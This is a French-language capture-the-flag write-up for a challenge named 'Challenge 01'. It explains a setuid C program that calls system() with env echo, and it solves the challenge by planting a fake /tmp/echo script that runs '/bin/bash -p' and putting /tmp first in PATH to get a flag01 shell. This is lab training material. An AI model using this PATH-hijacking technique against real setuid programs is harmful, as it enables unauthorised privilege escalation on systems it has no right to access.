# Challenge 01

Rappel de C : `int setresgid(gid_t rgid, gid_t egid, gid_t sgid);` définit les trois identifiants de groupe d'un processus en un seul appel : le real GID, l'effective GID et le saved GID.
- real GID (rgid) : à qui « appartient » le processus, le groupe de l'utilisateur qui l'a lancé.
- effective GID (egid) : celui utilisé pour les vérifications de permissions (accès aux fichiers, etc)
- saved GID (sgid) : une sauvegarde permettant de reprendre temporairement un GID privilégié puis d'y revenir


Code source du challenge :
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```
```bash
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
```

Fonctionnement du chall :
1. On définit variable `gid,uid`.
2. On stocke dans `gid` le GID **EFFECTIF** du processus appelant.
    - *Rappel : Renvoie le GID (Group ID :identifiant d'un groupe d'utilisateurs) du processus appelant*
3. On stocke dans `uid` l'UID **EFFECTIF** du processus appelant.
    - *Rappel : UID = user id*
4. On définit le GID effectif,réel et saved au GID de l'utilisateur qui possède le programme.
5. On définit le UID effectif,réel et saved au UID de l'utilisateur qui possède le programme.
6. On affiche `and now what` grâce à env.

### Problèmes

`getegid` : récupère le GID effectif (donc le propriétaire du fichier : `flag01`)

`geteuid` : récupère le UID effectif (donc le propriétaire du fichier : `flag01`)

Au lieu de drop les privilèges le programme les augmente.

### Exploitation

`/usr/bin/env` : lance le programme env

Le fonctionnement exacte de `env FOO=bar macommande arg1` est le suivant :
1. `env` part de l'environnement courant qu'il a hérité (ici `/home/flag01`)
2. Il applique les modifications que tu lui donnes (`FOO=bar` ajoute/écrase la variable FOO).
3. Il cherche macommande dans le `$PATH`
4. Il fait un execve() sur le programme trouvé, en lui passant arg1 et le nouvel environnement.

Idée :
1. On remplace `$PATH` actuel par `/tmp`
2. Dans `/tmp` on crée un shell bash qui ouvre une session
3. On a une session avec privilèges superieurs aux notres.

### Solution

On écrit dans `/tmp/echo` notre paylaod
```bash
#!/bin/bash
/bin/bash -p
```
On change le `PATH` (en gardant l'ancien en backup pour pas perdre les commandes de base).

`export PATH=/tmp:$PATH`

Puis on lance le fichier `./flag01` et on obtient le role `flag01` : c'est gagné !